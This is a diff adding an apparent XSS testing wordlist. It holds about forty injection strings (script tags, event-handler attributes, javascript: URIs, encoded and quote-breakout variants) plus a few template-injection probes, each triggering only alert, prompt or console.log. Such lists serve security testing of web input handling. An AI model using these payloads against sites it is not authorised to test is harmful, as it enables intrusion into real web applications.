@@ -1,0 +1,46 @@
+"><script>alert(1)</script>
+<script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+
+" autofocus onfocus=alert(1) x="
+" onmouseover=alert(1) "
+" onpointerenter=alert(1) "
+' onerror=alert(1) '
+
+"><img src=x onerror=alert`1`>
+<img src=x onerror=prompt(1)>
+<img src=1 onerror=confirm(1)>
+
+<svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><script>alert(1)</script>
+
+javascript:alert(1)
+javascript:prompt(1)
+
+<video src=x onerror=alert(1)>
+<a href=x onmouseover=alert(1)>hover</a>
+<div draggable="true" ondragstart=alert(1)>drag</div>
+
+</script><script>alert(1)</script>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+
+"><img src=x onerror=alert(document.domain)>
+"><script>console.log('DOMXSS')</script>
+<svg/onload=alert(location)>
+
+%3Cscript%3Ealert(1)%3C/script%3E
+"><img src=x onerror=alert(String.fromCharCode(49))>
+
+';alert(1);// 
+";alert(1);// 
+');alert(1);//
+
+<style>*{x:expression(alert(1))}</style>
+
+
+{{7*7}}
+{{constructor.constructor('alert(1)')()}}
+<%= alert(1) %>
